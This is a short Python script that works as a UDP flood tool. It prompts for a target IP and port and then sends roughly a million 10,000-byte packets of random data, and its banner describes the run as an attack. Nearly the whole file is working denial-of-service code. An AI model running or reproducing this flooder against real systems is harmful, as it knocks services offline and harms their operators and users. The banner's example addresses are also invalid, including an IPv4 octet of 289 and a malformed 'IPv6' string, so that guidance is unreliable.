#!/bin/python3

import socket 
import time
import random
s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)

print('''example: 
[$_<] ip it's ipV4 182.289.29.1
ip it's ipV6 182.289.294.472.14.1
port standart 80-81-http, 443-https
sleep 0 
[$_<] Stop runing attack it's keys [CTRL+C]
[$_<] Poused running process attack its's keys [CTRL+Z]
''')
ip = input('ip: ')
port = int(input('port: '))
sleep = 0

s.connect((ip, port))

for i in range(1, 1000*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)

